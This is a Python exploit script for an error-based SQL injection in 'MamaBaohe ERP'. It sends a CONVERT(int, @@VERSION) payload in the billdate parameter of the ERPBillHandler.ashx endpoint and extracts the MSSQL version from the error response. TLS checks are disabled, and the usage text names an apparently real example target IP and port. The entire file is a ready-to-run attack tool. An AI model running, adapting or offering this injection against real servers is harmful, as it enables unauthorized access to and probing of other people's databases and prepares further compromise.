#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MamaBaohe ERP SQL Injection - MSSQL Version Detection
Usage: python exp.py -u <ip>
"""

import requests
import sys
import argparse
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_mssql_version(ip):
    """Get MSSQL server version via SQL injection"""
    url = f"http://{ip}/APIHandler/ERPBillHandler.ashx"
    params = {
        'action': 'search',
        'billdate': "'+AND+1=CONVERT(int,+@@VERSION)+AND+'1'='1"
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    try:
        print(f"[*] Target: {ip}")
        print("[*] Sending payload...")
        
        response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            if 'info' in data:
                # Match MSSQL version pattern
                patterns = [
                    r"Microsoft SQL Server \d{4}.*?\)",
                    r"Microsoft SQL Server \d+.*?\)",
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, data['info'])
                    if match:
                        version = match.group(0)
                        print(f"\n[+] MSSQL Version: {version}")
                        return version
                
                # If no exact match, try broader pattern
                if '转换' in data['info'] or 'convert' in data['info'].lower():
                    match = re.search(r"Microsoft SQL Server[^']+", data['info'])
                    if match:
                        print(f"\n[+] MSSQL Version: {match.group(0)}")
                        return match.group(0)
                    
                    print("\n[+] SQL Injection confirmed, but version string not found")
                    print(f"[+] Response snippet: {data['info'][:150]}...")
                    return "MSSQL (version not extracted)"
        else:
            print(f"[-] HTTP Error: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to {ip}")
    except requests.exceptions.Timeout:
        print(f"[-] Connection timeout")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None


def main():
    parser = argparse.ArgumentParser(description='MamaBaohe ERP MSSQL Version Detection')
    parser.add_argument('-u', '--url', required=True, help='Target IP (e.g., 47.115.8.206:8081)')
    
    args = parser.parse_args()
    
    get_mssql_version(args.url)


if __name__ == '__main__':
    main()
